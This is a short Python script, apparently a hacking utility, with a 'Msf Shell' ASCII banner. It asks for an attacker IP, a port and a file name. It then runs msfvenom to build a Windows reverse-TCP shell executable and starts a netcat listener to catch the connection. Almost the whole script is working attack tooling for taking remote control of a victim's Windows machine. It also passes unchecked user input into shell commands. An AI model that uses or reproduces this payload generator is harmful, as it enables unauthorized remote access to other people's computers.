import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def win_net_tcp():
    os.system("clear")
    print(banner)
    print("Using: windows/shell/reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the exe: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: windows/shell/reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p windows/shell/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe")
    print("Payload created! [01]")
    print("Saved in: "+name+".exe")
    print("Running NetCat Listener...")
    os.system("gnome-terminal -- nc -nlvp "+port+"")
    input("Enter to return to the menu! ")
    os.system("clear")